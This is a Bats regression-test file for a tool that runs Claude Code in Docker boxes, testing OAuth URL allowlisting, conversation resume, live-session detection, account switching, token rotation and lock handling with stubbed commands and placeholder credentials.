# ─────────────────────────────────────────────────────────────────────────────
@test "regression vnext: the Claude authorize URL opens through the browser bridge" {
  local u
  u="https://claude.com/cai/oauth/authorize?code=true&redirect_uri=http%3A%2F%2Flocalhost%3A40701%2Fcallback"
  run _bridge_dest_allowed "$u"
  assert_success
  run _is_auth_url "$u"
  assert_success
  run _extract_callback_port "$u"
  assert_output "40701"
  u="https://platform.claude.com/oauth/authorize?code=true&redirect_uri=https%3A%2F%2Fplatform.claude.com%2Foauth%2Fcode%2Fcallback"
  run _bridge_dest_allowed "$u"
  assert_success
  run _is_auth_url "$u"
  assert_success
  # Exact hosts, never a suffix: a neighbour that merely ends in the same name
  # is still refused.
  run _bridge_dest_allowed "https://evilclaude.com/cai/oauth/authorize?redirect_uri=http%3A%2F%2Flocalhost%3A1%2Fcallback"
  assert_failure
  run _bridge_dest_allowed "https://auth.claude.com/oauth/authorize?redirect_uri=http%3A%2F%2Flocalhost%3A1%2Fcallback"
  assert_failure
}

@test "regression v1.4.3: resume does not reopen a conversation that is open in another terminal" {
  # cmd_resume ran `claude --continue`, which reopens the newest conversation in
  # the box's folder and skips a live one only when it is a BACKGROUND session.
  # With a second Claude still working in another terminal of the same box, the
  # newest conversation was that terminal's: the resumed process opened it,
  # registered the same session id, and both appended divergent histories to one
  # transcript (Claude Code 2.1.270 lab: 6/6 in the account investigation, 2/2
  # again on the v1.4.3 argv). Resume now names the newest conversation that no
  # live process holds.
  mkdir -p "$TEST_TEMP/project"
  local cname sdir mine="11111111-1111-4111-8111-111111111111" other="22222222-2222-4222-8222-222222222222" id
  cname="$(container_name_for "$TEST_TEMP/project")"
  mock_docker_ps "$cname"
  mock_docker_ps_a "$cname"
  sdir="$(_sessions_key_dir "$TEST_TEMP/project" main)"
  mkdir -p "$sdir"
  for id in "$mine" "$other"; do
    printf '%s\n' '{"parentUuid":null,"isSidechain":false,"type":"user","message":{"role":"user","content":"hi"},"entrypoint":"cli","sessionId":"'"$id"'"}' > "$sdir/$id.jsonl"
  done
  # Mine ended first; the other terminal wrote after that.
  touch -t 202601010000 "$sdir/$mine.jsonl"
  _box_live_session_ids() { printf '%s\n' "22222222-2222-4222-8222-222222222222"; }

  run cmd_resume "$TEST_TEMP/project"
  assert_success
  run assert_docker_exec_has "--dangerously-skip-permissions --resume $mine"
  assert_success
  run grep -F -- "$other" "$DOCKER_CALLS"
  assert_failure
  run grep -F -- "--continue" "$DOCKER_CALLS"
  assert_failure
}

@test "regression v1.4.3: resume keeps the 1M context the conversation ran on" {
  # Claude Code restores a resumed conversation's model from its last assistant
  # message, which records the bare id, and re-adds [1m] only when a model is
  # configured with it. On the default model nothing is, so `cleat resume`
  # brought an "Opus 5 (1M context)" conversation back as "Opus 5" and every
  # request lost the context-1m beta (lab: 4/4 x3, 2/2 critic, 2/2 again here).
  # The run's own usage record names the model it really ran, and resume now
  # passes it back.
  mkdir -p "$TEST_TEMP/project"
  local cname sdir id="11111111-1111-4111-8111-111111111111"
  cname="$(container_name_for "$TEST_TEMP/project")"
  is_running() { return 1; }
  mock_docker_ps_a "$cname"
  mkdir -p "$CLEAT_RUN_DIR/${cname}/settings"
  echo '{}' > "$CLEAT_RUN_DIR/${cname}/settings/settings.json"
  sdir="$(_sessions_key_dir "$TEST_TEMP/project" main)"
  mkdir -p "$sdir"
  printf '%s\n' \
    '{"parentUuid":null,"isSidechain":false,"type":"user","message":{"role":"user","content":"hi"},"entrypoint":"cli","sessionId":"'"$id"'"}' \
    '{"parentUuid":"u1","isSidechain":false,"message":{"id":"m1","type":"message","role":"assistant","model":"claude-opus-5","content":[]},"type":"assistant","sessionId":"'"$id"'"}' \
    '{"type":"cost-state","sessionId":"'"$id"'","modelUsage":{"claude-opus-5[1m]":{"inputTokens":12}}}' > "$sdir/$id.jsonl"

  run cmd_resume "$TEST_TEMP/project"
  assert_success
  run assert_docker_exec_has "--resume $id --model claude-opus-5[1m]"
  assert_success
}

# ─────────────────────────────────────────────────────────────────────────────
# v1.4.3: _box_has_live_agent grepped the WHOLE `docker top` output for
# claude|node, so any node process read as a live Claude session. Claude exits,
# a `vite --host` (or an MCP server, or a shell Claude's Bash tool started)
# stays up, and the box is "live" forever: the idle sweep never reclaims it and
# the attach heal never runs (both released), `cleat account` refuses with
# "main has a live Claude session" and a session delete refuses (both
# unreleased). Found by the maintainer on a real box, 2026-09-13.
#
# The fix judges only the command column, and only by its executable
# (_is_claude_argv). The fixture is what `docker top` prints for that box: the
# cleat PID 1 chain plus four leftovers, each a different decoy. The node one
# is the reported bug. The .claude/ paths (a plugin's MCP and LSP servers, a
# shell Claude's Bash tool started) are what a grep for claude alone still
# matched. The user name in the UID column is what a native Linux host prints
# when its user is called claude.
# ─────────────────────────────────────────────────────────────────────────────
_b17_top_after_claude_exited() {
  printf '%s\n' \
    'UID                 PID                 PPID                C                   STIME               TTY                 TIME                CMD' \
    'root                48213               48190               0                   09:14               ?                   00:00:00            /sbin/docker-init -- /entrypoint.sh bash' \
    'root                48260               48213               0                   09:14               ?                   00:00:00            su -s /bin/bash coder' \
    'claude              48262               48260               0                   09:14               ?                   00:00:00            bash' \
    'claude              50111               48213               0                   09:40               ?                   00:00:04            node /workspace/node_modules/.bin/vite --host' \
    'claude              50200               48213               0                   09:41               ?                   00:00:01            node /home/coder/.claude/plugins/cache/acme/mcp/dist/index.js' \
    'claude              50250               48213               0                   09:41               ?                   00:00:00            /home/coder/.claude/plugins/cache/acme/bin/acme-lsp --stdio' \
    "claude              50300               48213               0                   09:41               ?                   00:00:00            /bin/bash -c source /home/coder/.claude/shell-snapshots/snapshot-bash-1789295352419-hrzih4.sh 2>/dev/null || true && eval 'python3 -m http.server 8000' < /dev/null"
}

@test "regression v1.4.3: a leftover node dev server does not keep a detached box out of the idle sweep" {
  docker() {
    case "$1" in
      top)     _b17_top_after_claude_exited ;;
      inspect) echo 0 ;;
      stop)    printf '%s\n' "$*" >> "$TEST_TEMP/stopped" ;;
    esac
    return 0
  }
  run _box_has_live_agent "cleat-dev-11111111"
  assert_failure

  _running_cleat_boxes() { printf '%s\n' "cleat-dev-11111111"; }
  _path_mtime() { echo 1000; }            # detached long past the grace window
  run _sweep_idle_boxes "" 1800
  assert_success
  assert_output --partial "Stopped 1 idle session"
  run cat "$TEST_TEMP/stopped"
  assert_output "stop cleat-dev-11111111"

  # The same box with Claude still running in it must stay untouchable. This is
  # the "leave it running, walk away" promise the gate exists for.
  : > "$TEST_TEMP/stopped"
  docker() {
    case "$1" in
      top) _b17_top_after_claude_exited
           printf '%s\n' 'claude              50400               50390               0                   09:45               pts/0               00:00:09            claude --dangerously-skip-permissions --continue' ;;
      stop) printf '%s\n' "$*" >> "$TEST_TEMP/stopped" ;;
    esac
    return 0
  }
  run _sweep_idle_boxes "" 1800
  refute_output --partial "Stopped"
  [ ! -s "$TEST_TEMP/stopped" ]
}

@test "regression vnext: cleat account switches a box whose only node process is a dev server" {
  CLEAT_ACCOUNTS_DIR="$TEST_TEMP/home/.config/cleat/accounts"
  CLEAT_BOX_ACCOUNTS_DIR="$TEST_TEMP/home/.config/cleat/box-accounts"
  CLEAT_RUN_DIR="$TEST_TEMP/home/.config/cleat/run"
  CLEAT_PROJECTS_DIR="$TEST_TEMP/home/.config/cleat/projects"
  mkdir -p "$CLEAT_ACCOUNTS_DIR/b" "$CLEAT_BOX_ACCOUNTS_DIR" "$CLEAT_RUN_DIR" "$CLEAT_PROJECTS_DIR"
  chmod 700 "$CLEAT_ACCOUNTS_DIR/b"
  _CLEAT_NOW_S=1789000000
  _has_unicode() { return 1; }
  curl() { cat >/dev/null 2>&1; return 7; }
  printf '{"claudeAiOauth":{"accessToken":"at-B0","refreshToken":"rt-B","expiresAt":1789003600000,"subscriptionType":"max"}}\n' \
    > "$CLEAT_ACCOUNTS_DIR/b/.credentials.json"
  chmod 600 "$CLEAT_ACCOUNTS_DIR/b/.credentials.json"
  # The box is up and the only thing left running in it is a dev server.
  _daemon_up() { return 0; }
  container_exists() { return 0; }
  is_running() { return 0; }
  docker() {
    case "$1" in
      top)     _b17_top_after_claude_exited ;;
      inspect) printf '%s\n' "/home/coder/.cleat-auth" ;;
    esac
    return 0
  }
  run _account_do_switch b main "cleat-proj-abcdef12" "$TEST_TEMP/proj"
  assert_success
  refute_output --partial "live Claude session"
  run _box_account_read "cleat-proj-abcdef12"
  assert_output "b"
}

# ─────────────────────────────────────────────────────────────────────────────
# v1.4.3: enabling a kit on a STOPPED box said "A session is live in this box".
# `docker top` fails on a stopped container and _box_has_live_agent maps any
# failure to "live", which is right for a gate and wrong for a note. The note
# lacked the is_running term every other caller carries.
# ─────────────────────────────────────────────────────────────────────────────
@test "regression v1.4.3: enabling a kit on a stopped box does not claim a live session" {
  CLEAT_RUN_DIR="$CLEAT_CONFIG_DIR/run"
  CLEAT_KITS_DIR="$CLEAT_CONFIG_DIR/kits"
  CLEAT_BOXES_DIR="$CLEAT_CONFIG_DIR/boxes"
  CLEAT_PROJECTS_DIR="$CLEAT_CONFIG_DIR/projects"
  mkdir -p "$TEST_TEMP/project"
  cd "$TEST_TEMP/project"
  local cname
  cname="$(container_name_for "$TEST_TEMP/project")"
  mock_docker_ps ""
  mock_docker_ps_a "$cname"
  _container_has_kit_mounts() { return 0; }
  DOCKER_EXIT_CODE=1   # every docker call the stub does not special-case fails, top included
  export DOCKER_EXIT_CODE
  run cmd_kit plan-big-execute-small <<< "y"
  assert_success
  refute_output --partial "A session is live in this box"
  assert_output --partial "Takes effect next session"
}

# ─────────────────────────────────────────────────────────────────────────────
# vnext (unreleased account switching): on a host with no jq a pinned box kept
# or gained the wrong identity. _account_invalidate_identity returned at once
# without jq, and the builder's no-jq branch kept the persisted copy or copied
# the host file whole, so the box launched carrying the previous account's (or
# the host's) oauthAccount. That name is what Claude shows, and its
# organisation goes out with the new account's token. The host still has no jq
# after the fix: the BOX's own jq does the transform, at the switch when the
# box is running and just before the next launch otherwise.
# ─────────────────────────────────────────────────────────────────────────────

# A jq-less host whose box has jq. The stand-in answers exactly the in-box
# filter call with the real binary and hands every other docker call to the
# stub, so nothing else changes behaviour.
_b12_setup() {
  command -v jq >/dev/null || skip "needs jq to stand in for the box's own"
  _B12_JQ="$(command -v jq)"
  _B12_PROJ="$TEST_TEMP/proj"
  mkdir -p "$_B12_PROJ"
  _B12_CN="$(container_name_for "$_B12_PROJ" main)"
  _B12_KEY="$(_derive_project_session_key "$_B12_PROJ" main)"
  mkdir -p "$CLEAT_PROJECTS_DIR/$_B12_KEY"
  _B12_F="$CLEAT_PROJECTS_DIR/$_B12_KEY/claude.json"
  # No switch here has a login to harvest, so nothing should reach the network.
  # If anything ever does, it fails instead of asking a real Anthropic host.
  curl() { cat >/dev/null 2>&1; return 7; }
  _account_usage_fetch() { return 0; }
  _box_has_live_agent() { return 1; }
  _account_box_ready() { return 0; }
  _hide_jq
}
_b12_box_stopped() {
  _daemon_up() { return 1; }
  container_exists() { return 1; }
  is_running() { return 1; }
}
_b12_box_running() {
  _daemon_up() { return 0; }
  container_exists() { return 0; }
  is_running() { return 0; }
  docker() {
    if [ "$1" = exec ] && [ "$2" = -i ] && [ "$4" = jq ]; then
      shift 4
      "$_B12_JQ" "$@"
      return
    fi
    command docker "$@"
  }
}
_b12_identity() { "$_B12_JQ" -r '.oauthAccount.emailAddress // "absent"' "$_B12_F"; }

@test "regression vnext: a jq-less host clears the old account from a box switched while stopped" {
  _b12_setup
  _b12_box_stopped
  _account_ensure_dir a
  _box_account_write "$_B12_CN" a "$_B12_KEY"
  printf '{"oauthAccount":{"emailAddress":"a@example.com","organizationUuid":"org-a","profileFetchedAt":9999999999999},"userID":"abc","cachedUsageUtilization":{"x":1}}\n' > "$_B12_F"
  run _account_do_switch b main "$_B12_CN" "$_B12_PROJ"
  assert_success
  # The next start: the rebuild runs while the box is stopped, then the box
  # comes up and the launch hook runs.
  _refresh_project_claude_json "$_B12_PROJ" main
  _b12_box_running
  # The real launch path, not the hook on its own: exec_claude is what has to
  # reach the file before Claude does.
  _RESOLVED_PROJECT="$_B12_PROJ"
  _BOX=main
  run exec_claude "$_B12_CN" --dangerously-skip-permissions
  run _b12_identity
  assert_output "absent"
  run "$_B12_JQ" -r '.cachedUsageUtilization // "absent"' "$_B12_F"
  assert_output "absent"
  # A targeted delete, not a reset: the rest of the file survives.
  run "$_B12_JQ" -r '.userID' "$_B12_F"
  assert_output "abc"
}

@test "regression vnext: a jq-less host clears the old account at the switch when the box is running" {
  _b12_setup
  _b12_box_running
  _account_ensure_dir a
  _box_account_write "$_B12_CN" a "$_B12_KEY"
  printf '{"oauthAccount":{"emailAddress":"a@example.com"},"userID":"abc"}\n' > "$_B12_F"
  local before after
  before="$(ls -i "$_B12_F" | awk '{print $1}')"
  run _account_do_switch b main "$_B12_CN" "$_B12_PROJ"
  assert_success
  run _b12_identity
  assert_output "absent"
  # The box binds this file, so the edit has to keep its inode.
  after="$(ls -i "$_B12_F" | awk '{print $1}')"
  [ "$before" = "$after" ] || { echo "inode changed under a running box"; return 1; }
}

@test "regression vnext: a box created pinned on a jq-less host does not launch with the host account" {
  _b12_setup
  _account_ensure_dir work
  _box_account_write "$_B12_CN" work "$_B12_KEY"
  printf '{"oauthAccount":{"emailAddress":"host@example.com"},"userID":"abc"}\n' > "$HOME/.claude.json"
  _build_project_claude_json "$_B12_F" "" "$_B12_CN"
  _b12_box_running
  run _refresh_attached_claude_json "$_B12_CN" "$_B12_PROJ" main
  assert_success
  run _b12_identity
  assert_output "absent"
  run "$_B12_JQ" -r '.userID' "$_B12_F"
  assert_output "abc"
}

@test "regression vnext: a jq-less host clears the named account from a stopped box put back on the shared login" {
  _b12_setup
  _b12_box_stopped
  _account_ensure_dir a
  _box_account_write "$_B12_CN" a "$_B12_KEY"
  printf '{"oauthAccount":{"emailAddress":"host@example.com"},"userID":"abc"}\n' > "$HOME/.claude.json"
  printf '{"oauthAccount":{"emailAddress":"a@example.com"},"userID":"abc"}\n' > "$_B12_F"
  run _account_do_switch default main "$_B12_CN" "$_B12_PROJ"
  assert_success
  # An unpinned box is not flagged by the rebuild, so only the switch's own
  # flag can carry this one to the launch.
  _refresh_project_claude_json "$_B12_PROJ" main
  _b12_box_running
  run _refresh_attached_claude_json "$_B12_CN" "$_B12_PROJ" main
  assert_success
  run _b12_identity
  assert_output "absent"
}

@test "regression vnext: the jq-less identity clear never edits the file under a live Claude" {
  # A config write racing the in-place copy puts the old name straight back,
  # and a delete under a live Claude Code freezes its own later saves of that
  # file. The next launch tries again.
  _b12_setup
  _b12_box_stopped
  _account_ensure_dir a
  _box_account_write "$_B12_CN" a "$_B12_KEY"
  printf '{"oauthAccount":{"emailAddress":"a@example.com"},"userID":"abc"}\n' > "$_B12_F"
  run _account_do_switch b main "$_B12_CN" "$_B12_PROJ"
  assert_success
  _b12_box_running
  _box_has_live_agent() { return 0; }
  run _refresh_attached_claude_json "$_B12_CN" "$_B12_PROJ" main
  assert_output --partial "still carries another account"
  run _b12_identity
  assert_output "a@example.com"
  # And the next launch, with the session gone, still clears it.
  _box_has_live_agent() { return 1; }
  run _refresh_attached_claude_json "$_B12_CN" "$_B12_PROJ" main
  refute_output --partial "still carries another account"
  run _b12_identity
  assert_output "absent"
}

# ─────────────────────────────────────────────────────────────────────────────
# Two boxes on ONE account, the shipped Boxes plus cleat account combination.
# Claude rotates the refresh token on nearly every refresh, so the box that
# refreshed last advanced the store and the OTHER box was left staged on the
# generation before it. The attach read that as "a login this account does not
# have": it warned on the terminal, kept a copy of a live refresh token for
# thirty days and offered to adopt it as a separate account. Every attach of
# the box that fell behind did it again, so the copies piled up. The same hold
# fired from the release path on `cleat account default` and on a re-pin.
# ─────────────────────────────────────────────────────────────────────────────
@test "regression vnext: a box staged on a generation its account already replaced is not held" {
  _acct_race_setup
  local mode acct a b c store staged_a staged_b staged_c
  for mode in jq nojq; do
    [[ "$mode" == nojq ]] && _hide_jq
    acct="work-$mode"
    a="cleat-main-$mode"; b="cleat-api-$mode"; c="cleat-docs-$mode"
    store="$CLEAT_ACCOUNTS_DIR/$acct/.credentials.json"
    staged_a="$CLEAT_RUN_DIR/$a/auth/.credentials.json"
    staged_b="$CLEAT_RUN_DIR/$b/auth/.credentials.json"
    staged_c="$CLEAT_RUN_DIR/$c/auth/.credentials.json"
    # One account, one login, three boxes pinned to it, all on generation 1.
    _acct_race_cred "$store" "G1$mode" a 1789003600000
    _acct_race_cred "$staged_a" "G1$mode" a 1789003600000
    _acct_race_cred "$staged_b" "G1$mode" a 1789003600000
    _acct_race_cred "$staged_c" "G1$mode" a 1789003600000
    _box_account_write "$a" "$acct"
    _box_account_write "$b" "$acct"
    _box_account_write "$c" "$acct"
    printf 'uuid\t%s\nwho\tlab-a@lab.invalid\n' "$_ACCT_UUID_A" > "$CLEAT_ACCOUNTS_DIR/$acct/meta"
    _acct_ident_profile "$_ACCT_UUID_A" lab-a@lab.invalid
    # Box A's Claude refreshes. The refresh token rotates, so the store and the
    # two other boxes are a generation behind from here on.
    _acct_race_cred "$staged_a" "G2$mode" a 1789028800000
    run _account_sync_out "$a"
    assert_equal "$mode harvest $status" "$mode harvest 0"
    run grep -c "rt-G2$mode" "$store"
    assert_output "1"
    # Box B attaches on the old generation. Nothing is held and nothing is said.
    run _account_sync_in "$b"
    assert_success
    refute_output --partial "Kept a login"
    run grep -c "rt-G2$mode" "$staged_b"
    assert_output "1"
    # And the release path, which every switch, remove and nuke goes through.
    run _account_with_lock _account_release_staged_locked "$c"
    assert_success
    refute_output --partial "Kept a login"
    run test -e "$CLEAT_ACCOUNTS_DIR/.held"
    assert_failure
  done
  unset -f command
}

# ─────────────────────────────────────────────────────────────────────────────
# Every mkdir failure read as "someone else holds the lock", so an accounts
# directory that could not take a lock at all (root-owned after a sudo run, a
# read-only mount, a full disk) was polled for the whole twenty seconds, twice
# per session (attach and session end), and the line at the end of it named
# another cleat command and asked for a retry that could never work.
# ─────────────────────────────────────────────────────────────────────────────
@test "regression vnext: a lock that cannot be made fails at once and names the directory" {
  _acct_race_setup
  local rc=0 lock
  _ACCOUNT_LOCK_WAIT_S=20
  lock="$(_account_lock_path)"
  _account_lock_pause() { echo poll >> "$TEST_TEMP/polls"; }
  # What EACCES, EROFS and ENOSPC all look like: mkdir fails and leaves nothing
  # at the path.
  mkdir() {
    [[ "$1" == "$lock" ]] && return 1
    command mkdir "$@"
  }
  _account_lock || rc=$?
  assert_equal "unwritable $rc" "unwritable $_ACCOUNT_LOCK_BUSY"
  run test -e "$TEST_TEMP/polls"
  assert_failure
  run _account_busy_msg
  assert_output --partial "Check that $CLEAT_ACCOUNTS_DIR is writable."
  refute_output --partial "Try again in a moment"
  # And the session end, which is where a pinned box meets this twice a session.
  run _maybe_report_account_harvest_busy "$_ACCOUNT_LOCK_BUSY"
  assert_output --partial "Check that $CLEAT_ACCOUNTS_DIR is writable."
  refute_output --partial "saved when the next session ends"
  unset -f mkdir
  # A lock another live command holds is still waited on, and still says so.
  rc=0
  _ACCOUNT_LOCK_WAIT_S=1
  command mkdir -p "$lock"
  printf 'host %s pid %s at %s\n' "${HOSTNAME:-unknown}" "$$" "$(date +%s)" > "$lock/owner"
  _account_lock || rc=$?
  assert_equal "busy $rc" "busy $_ACCOUNT_LOCK_BUSY"
  run wc -l < "$TEST_TEMP/polls"
  assert_output --partial "10"
  run _account_busy_msg
  assert_output --partial "Try again in a moment"
  refute_output --partial "is writable"
  run _maybe_report_account_harvest_busy "$_ACCOUNT_LOCK_BUSY"
  assert_output --partial "saved when the next session ends"
  refute_output --partial "is writable"
}

# ─────────────────────────────────────────────────────────────────────────────
# The session-end harvest makes a bounded network request whenever the box
# refreshed and the refresh token rotated. It ran BEFORE the terminal restore,
# so a black-holed route, a captive portal or a dropped VPN left the terminal
# in Claude's raw mode for the whole timeout with nothing on screen saying why.
# ─────────────────────────────────────────────────────────────────────────────
@test "regression vnext: the session-end harvest runs only after the terminal is back" {
  _account_sync_out() { echo harvest >> "$TEST_TEMP/order"; return 0; }
  _restore_terminal() { echo restore >> "$TEST_TEMP/order"; }
  run exec_claude "test-ctr" --dangerously-skip-permissions
  assert_success
  run cat "$TEST_TEMP/order"
  assert_output "$(printf 'restore\nharvest')"
}
